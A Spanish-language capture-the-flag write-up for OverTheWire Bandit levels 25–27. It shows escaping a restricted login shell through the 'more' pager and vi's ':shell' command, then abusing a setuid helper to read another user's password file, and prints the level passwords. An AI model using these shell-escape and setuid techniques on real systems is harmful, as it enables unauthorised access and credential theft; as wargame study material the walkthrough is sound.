En este ejerciocio nos encontramos con que el usuario bandit26 no tiene una bash por lo que no podemos conectar.  

Pass next level :upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB

Pass de bandit26 : s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

El concept aqui es escapar del contexto de un comando

```
bandit25@bandit:~$ grep bandit26 /etc/passwd
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

Esto es asombroso.
Aqui ocurre que cuando los comando more o less no pueden contemplar todo el contenido en la pantalla podemos ejecutar comando mediante las opciones de estos. Como sera pues nos intentamos conectar al servidor con la key que encontramos de bandit26

```
ssh -i new_rsa bandit26@bandit.labs.overthewire.org -p 2220

Pero de una consola cuya altura sea muy pequeña para que fuerce a entrar a un modo interactivo del comando more que es el que se ejecuta

una vez viendo more en pantalla precionamos v (modo visual para ejecutar instrucciones) luego Esc; Shift+: ; y aqui nos creamos una variable 
:shell=/bin/bash

Precionamos Esc; Shift+:
	Llamamos la variable que nos dara una bash
:shell 

Obtenemos una shell como  bandit26 escapando del contexto
-rwsr-x--- 1 bandit27 bandit26 14884 Oct 14 09:26 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Oct 14 09:26 text.txt

Tenemos un fichero ejecutable bandit27-do con permiso suid activo y propietario bandit27

Al ejecutar nos dice que podemos pasarle comando, pues leeremos el fichero pass de bandit27 aprovechando esa mala configuracion
./bandit27-do 
Run a command as another user.
  Example: ./bandit27-do id
  
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```